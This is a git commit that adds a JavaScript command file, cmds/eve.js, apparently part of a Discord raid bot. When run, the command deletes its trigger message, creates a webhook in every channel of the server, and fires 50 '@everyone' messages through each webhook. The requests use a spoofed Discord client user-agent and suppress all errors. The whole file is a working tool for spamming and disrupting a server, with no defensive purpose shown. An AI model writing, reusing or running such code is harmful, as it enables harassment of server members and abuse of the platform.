5beab1a5dcf6b120c159b107d637dc73c08c348a
7 <63388132+maltrataram@users.noreply.github.com>
2023-10-27 09:38:59 -0300

    Create eve.js

---
+++ cmds/eve.js
@@ -0,0 +1,30 @@
+const colors = require('colors')
+const { everyoneMsg } = require("../config.json");
+const axios = require('axios')
+
+function spam(wb) {
+    for (let amount = 0; amount < 50; amount++) {
+        axios({
+            url: `https://discordapp.com/api/webhooks/${wb.id}/${wb.token}`,
+            method: "POST",
+            data: {
+                "content": `@everyone ${everyoneMsg}`
+            },
+            headers: {
+                "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.309 Chrome/83.0.4103.122 Electron/9.3.5 Safari/537.36"
+            }
+        }).then(() => {}).catch(err => {})
+    }
+}
+
+exports.run = async(client, message, args) => {
+    message.delete();
+    message.guild.channels.forEach(c => {
+        c.createWebhook(`xiuu!.`).then(
+            wb => spam(wb)
+        ).catch(e => {})
+    });
+
+
+    console.log(colors.green("  [+] Everyone flooded."))
+}
